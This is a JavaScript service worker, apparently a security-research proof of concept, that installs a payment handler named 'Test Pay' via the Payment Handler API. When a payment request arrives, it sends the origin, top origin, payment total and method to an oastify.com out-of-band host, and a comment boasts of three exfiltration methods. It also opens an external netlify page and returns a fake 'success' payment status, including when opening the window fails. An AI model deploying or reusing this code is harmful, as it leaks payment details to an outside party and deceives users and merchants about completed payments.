const OOB = 'https://ua8bgofxi61ugvubb5h68nigu70yopce.oastify.com';

  self.addEventListener("install", e => {
    self.skipWaiting();
    e.waitUntil(
      self.registration.paymentManager.instruments.set("basic", {
        name: "Test Pay",
        method: "https://gleeful-creponne-8ff162.netlify.app/pay.json"
      })
    );
  });

  self.addEventListener("activate", e => e.waitUntil(clients.claim()));

  self.addEventListener("paymentrequest", e => {
    const data = {
      origin: e.paymentRequestOrigin,
      top:    e.topOrigin,
      total:  JSON.stringify(e.total),
      method: e.methodName
    };

    // 3 exfil methods — at least one will land
    fetch('https://' + OOB.split('//')[1] + '/sw_payment?' +
      new URLSearchParams(data).toString(), { mode: 'no-cors' });

    new self.clients.matchAll().then(list =>
      list.forEach(c => c.postMessage({type: 'sw_fired', data}))
    );

    e.respondWith(
      e.openWindow('https://gleeful-creponne-8ff162.netlify.app/pay-handler.html')
        .then(client => {
          if (client) client.postMessage({type: 'ctx', ...data});
          return { methodName: e.methodName, details: { status: 'success' } };
        })
        .catch(err => {
          // openWindow failed — still exfil
          fetch('https://' + OOB.split('//')[1] + '/sw_openwin_fail?e=' +
            encodeURIComponent(err.message) + '&' + new URLSearchParams(data).toString(),
            { mode: 'no-cors' });
          return { methodName: e.methodName, details: { status: 'success' } };
        })
    );
  });
